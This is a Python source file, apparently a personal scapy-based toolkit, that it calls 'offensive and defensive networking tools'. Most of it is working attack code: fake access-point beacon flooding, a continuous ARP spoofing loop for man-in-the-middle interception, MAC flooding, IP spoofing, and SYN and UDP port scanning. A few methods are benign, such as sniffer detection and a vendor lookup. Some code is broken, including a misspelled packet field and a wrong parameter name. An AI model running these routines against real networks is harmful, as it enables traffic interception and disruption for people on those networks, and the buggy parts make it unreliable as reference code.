#!/usr/bin/python3

from os import geteuid, system
from random import randrange

import requests

try:
    from scapy.all import (ARP, ICMP, IP, TCP, UDP, Dot11, Dot11Beacon,
                           Dot11Elt, Ether, RadioTap, RandIP, RandMAC, conf,
                           promiscping, send, sendp, sr1, srp)
except:
    print('Module: >scapy< not found.')

if int(geteuid()) != 0:
    print("You must be a root to use this module")
else:
    pass

conf.verb = 0  # ignoring scapy outputs


class NetworkCheck:
    """
    Module for programming offensive and defensive networking tools based on scapy
    """
    def __init__(self):
        pass

    # creating fake access points
    def create_beacons(self, target_ESSID, interface, target_MAC):
        """
        Method for creating fake access points
        """
        self.interface = interface
        self.target_ESSID = target_ESSID
        self.target_MAC = target_MAC

        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=str(self.target_MAC), addr3=str(self.target_MAC))
        beacons = Dot11Beacon()
        essid = Dot11Elt(ID='SSID', info=str(self.target_ESSID), len=len(self.target_ESSID))
        frames = RadioTap()/dot11/beacons/essid
        sendp(frames, inter=0.1, iface=str(self.interface), loop=1)

    # ARP spoofing for MITM attacks
    def arp_spoof(self, router_ip, target_ip, interface):
        """
        Method for ARP spoofing.
        Example usage: nttl.arpSpoof(router_ip='192.168.1.1', target_ip='192.168.1.154', interface='wlan0')
        """
        self.router_ip = router_ip
        self.target_ip = target_ip
        self.interface = interface

        mac_addr = f"ifconfig {self.interface} | grep -o 'ether [a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*' | cut -c7-23 > mac.txt"
        system(mac_addr)
        get_mac = open('mac.txt', 'r').read().split('\n')
        system('rm -rf mac.txt')

        system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
        try:
            # sending fake ARP requests
            while True:
                send(ARP(op=2, pdst=self.target_ip, hwsrc=get_mac[0], psrc=self.router_ip), verbose=0)
        except:
            # disabling IP forwarding if any exception occurs
            system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")

    # alive host scanning
    def host_prober(self, interface, subnet):
        """
        Method for probing alive hosts on desired network.
        Example usage: nttl.host_prober(interface='wlan0', subnet='192.168.1.0/24')
        """
        self.interface = interface
        self.subnet = subnet

        ans, un_ans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.subnet), iface=self.interface, timeout=2)
        up_hosts = []
        for snd, rcv in ans:
            result = rcv.sprintf(r'"%ARP.psrc% %Ether.src%').split()
            up_hosts.append(result)
        return up_hosts

    # TCP stealth port scanning
    def tcp_port_scanner(self, target_ip, start_point, end_point):
        """ Method for scanning range of TCP ports
            Example usage: nttl.tcpPortScanner(target_ip='192.168.1.1', start_point=1, end_point=100)
            This code should scan 1-100 range of ports
        """
        self.target_ip = target_ip
        self.start_point = start_point
        self.end_point = end_point

        open_TCP_ports = []
        for port in range(self.start_point, self.end_point):
            # creating and sending syn packets
            src_port = randrange(50000, 60000)
            syn_pack = IP(dst=self.target_ip)/TCP(sport=src_port, dport=port, flags="S")
            response = sr1(syn_pack, timeout=1, verbose=0)
            if response:
                if response[TCP].flags == 18:
                    # if response is ACK, then send RST packets
                    rst_pack = IP(DST=self.target_ip)/TCP(sport=src_port, dport=port, flags="R")
                    response = send(rst_pack)
                    open_TCP_ports.append(port)
        return open_TCP_ports

    # UDP port scanning
    def udp_port_scanner(self, target_ip, start_point, end_point):
        """
        Method for scanning range of UDP ports
        Example usage: nttl.udp_port_scanner(target_ip='192.168.1.1', start_point=1, end_point=100)
        """
        self.target_ip = target_ip
        self.start_point = start_point
        self.end_point = end_point

        open_UDP_ports = []
        for port in range(self.start_point, self.end_point):
            udp_packet = IP(dst=self.target_ip)/UDP(dport=port)
            response = sr1(udp_packet, timeout=5, verbose=0)
            if response == None:
                open_UDP_ports.append(port)
            else:
                pass
        return open_UDP_ports

    # enabling wireless monitoring
    def enable_monitor(self, interface):
        """
        Method for enabling wireless monitoring mode
        NOTE: This method needs aircrack-ng suite
        Example usage: nttl.enable_monitor(interface='wlan0')
        """
        self.interface = interface

        try:
            command = "sudo airmon-ng-check kill > /dev/null"
            system(command)
            command = f"sudo airmon-ng start {self.interface} > /dev/null"
            system(command)
            return True
        except:
            print("An error occured while enabling monitor mode")
            return False

    # disabling wireless monitoring - cleaning everything
    def disable_monitor(self, interface):
        """
        Method for disabling wireless monitoring mode
        Example usage: nttl.disable_monitor(interface='wlan0mon')
        """
        self.interface = interface

        try:
            command = "sudo airmon-ng stop {} > /dev/null".format(self.interface)
            system(command)
            command = "sudo systemctl restart NetworkManager.service > /dev/null"
            system(command)
            command = "sudo systemctl restart wpa_supplicant.service > /dev/null"
            system(command)
            return True
        except:
            print("An error occured while disabling monitor mode")
            return False

    # getting device vendor by target's MAC address
    def get_vendor(self, target_MAC):
        """
        Method fot getting information about device vendor by device's MAC address
        Example usage: nttl.get_vendor(target_MAC='12:ab:34:cd:ef:78')
        """
        self.target_MAC = target_MAC

        vendor = requests.get("https://api.macvendors.com/{}".format(self.target_MAC))
        return vendor.text
        

    # simulating MAC flood attacks
    def MAC_flood(self, interface, target_ip):
        """
        Method for MAC flooding
        Example usage: nttl.mac_flood(interface='wlan0', target_ip='192.168.1.154')
        """
        self.interface = interface
        self.target_ip = target_ip
        
        flood_packet = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"), dst=self.target_ip)/ICMP()
        sendp(flood_packet, iface=self.interface, loop=1)

    # sniffer detection
    def bad_nose(self, subunet):
        """
        Method for detecting network sniffers remotely on network
        Example usage: nttl.bad_nose(subnet='192.168.1.0/24')
        """
        self.subnet = subnet
        
        promiscping(self.subnet)

    # IP spoofing
    def ip_spoof(self, fake_ip, target_ip):
        """
        Method for simulating IP spoofing attacks
        Example usage: nttl.ip_spoof(fake_ip='192.168.1.x', target_ip='192.168.1.154')
        """
        self.fake_ip = fake_ip
        self.target_ip = target_ip

        pack_spoof = IP(src=self.fake_ip, dst=self.target_ip)/ICMP()
        send(pack_spoof)
